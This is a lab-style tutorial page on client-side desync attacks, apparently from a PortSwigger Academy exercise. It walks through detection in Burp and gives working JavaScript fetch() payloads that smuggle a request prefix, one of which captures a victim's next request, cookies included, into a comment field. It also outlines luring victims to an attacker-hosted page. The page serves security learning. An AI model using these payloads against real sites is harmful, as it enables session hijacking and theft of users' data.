---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Client Side Desync

## About Client Side Desync

Client side desync(CSD) happens between the browser and the vulnerable web server. Comparing to traditional request smuggling which happens on the server side where attacker try to cause a desynchronization between frontend and the backend servers.

## HTTP/1 is more vulnerable

* HTTP/2 eliminates ambiguity in request size by using a mandatory message length field.
* Previous protocols, like HTTP/1.1, rely on `Content-Length` and `Transfer-Encoding` headers to determine request size.
* This reliance can cause desynchronization issues between browser and servers if they interpret these headers differently.

## Steps to identify - Workflow

### Probing desync vectors in Burpsuite

To effectively test, send a POST request where the `Content-Length` header value exceeds the actual body size of the request.&#x20;

* If response results in a timeout -> This would suggest that the backend is **not** ignoring the `content-length` header and is waiting for the rest of the data
* if response results in a immediate response -> This suggest that the backend is probably ignoring the `content-length` header and could potentially be a CSD vector just like in CL.

{% hint style="info" %}
TIP : Send request to endpoints (e.g. static files such as images)not expecting the POST method or endpoints that have server-level redirects
{% endhint %}

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption><p>Sending POST request to / endpoint with no body and a CL of 20 results in an response code of 302</p></figcaption></figure>

{% hint style="info" %}
TIP : Send request to endpoints (e.g. static files such as images)not expecting the POST method or endpoints that have server-level redirects
{% endhint %}

### Confirm CSD vector

Once we have found a probable vulnerable endpoint, we can proceed to confirm whether it is exploitable.  Some secure servers respond without  waiting for the body to arrive but still can parse it correctly while others dont have the correct implementation of the CL header where the connection closes. All these could result in false positive.

To test,&#x20;

* Send a request with normal CL value and a prefixed payload to an arbitary endpoint&#x20;

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption><p>Server accepts our payload for the first request</p></figcaption></figure>

* Send normal follow up request

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption><p>Follow up request encounters error due to the prefix that was smuggled in the first request</p></figcaption></figure>

The first request should result in a positive respond code(200/300) while the follow up request should result in a 404 response code

{% hint style="info" %}
Important to note here is that these 2 request MUST be from the same connection!
{% endhint %}

### Replicate the POC in browser

We need to replicate the desync in the browser because this is a browser based attack vector,  we need to make sure that the attack can happen in a real browser. Using tools like burp only, we can only inspect the http traffic and we cannot determine how the browser behaves. Only when we can confirm the CSD vulnerability in the real browser

We first need to navigate to our attack server/site, usually we want to launch attack from a different site. Use the code snippet provided by James Kettle that uses fetch API to send the request via the browser developer console.

{% hint style="info" %}
Note that here we are using the catch() because we are intentionally setting CORS to true as we don't want the browser to redirect but instead throw an error and we can continue the attack with our subsequent request.
{% endhint %}

{% code overflow="wrap" %}
```javascript
fetch('https://0aa200c60365b6b883d32d0100060059.h1-web-security-academy.net/', 
    {method: 'POST', body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x', mode: 'cors',     credentials: 'include' })
    .catch(() => { fetch('https://0aa200c60365b6b883d32d0100060059.h1-web-security-academy.net/',
    { mode: 'no-cors', credentials: 'include' }) })
```
{% endcode %}

Taking a look at the network tabs shows that our first request resulted in a CORS error which is expected and second request resulted in a 404 error code.&#x20;

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption><p>Results from network tab</p></figcaption></figure>

### Identify exploitable gadget using Burp

Next, we need to find a gadget that can be exploited for this CSD vulnerability. Triggering a 404 response doesn't really demonstrate how much of impact this can make. Functionality of a website that stores text could be used here as we can retrieve passwords,sessions IDs, api keys which can be retrieved later.

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption><p>A comment functionality can be used as a gadget to capture and store the requests made by victim</p></figcaption></figure>

<div align="left">

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption><p>Subsequent request is sent and stored in the backed/database</p></figcaption></figure>

</div>

### Replicate the exploit in Browser

Again, we will use the fetch api in the developer console of the browser to see if we can achieve the same result. Note that here, we have changed our payload body to the endpoint of the storage functionality of the application

```javascript
fetch('https://0a06001e03b0b0a280ab859a00850073.h1-web-security-academy.net/', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a06001e03b0b0a280ab859a00850073.h1-web-security-academy.net\r\nCookie: session=yyaTA46Em8RgYMEYYeXVc6sr4ItseTM3; _lab_analytics=XIrLPrvxYmBTtZYGAMv4IesEkyDLP6KnEVtMUYd6JTAgGzU4IkBuAVYrjxbEd59DvX1BnNxh1HXlf33NzBiGR9EIBI19q4e8QwRMArL2dtx1UegMYEilhssX8zkpsR1u9VcvVQybdZba4zkkvg9vCLZVsxvHvjdJeb0sXbLJos2hXG8n7N6ltpvUy5TKkKt6mgFSlhx9ITBvnJLpPodda3jmUkQbQv54zdOqYB7QUVjBcicx1yR0KRWqYc6oId56\r\nContent-Length: 250\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=8YYgSdujMVp68fZhCVKy79phKbNkHD1k&postId=7&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://0a06001e03b0b0a280ab859a00850073.h1-web-security-academy.net/en/post?postId=7', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

### Exploit

The JS script needs to be hosted in the attacker environment and craft a malicious URL to send to the victim. When the victim clicks the link, it will direct them to the attacker server where the response with the malicious code is delivered to the victim's browser and malicious code will be rendered

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption><p>Victom's request is being saved into the database of the application </p></figcaption></figure>
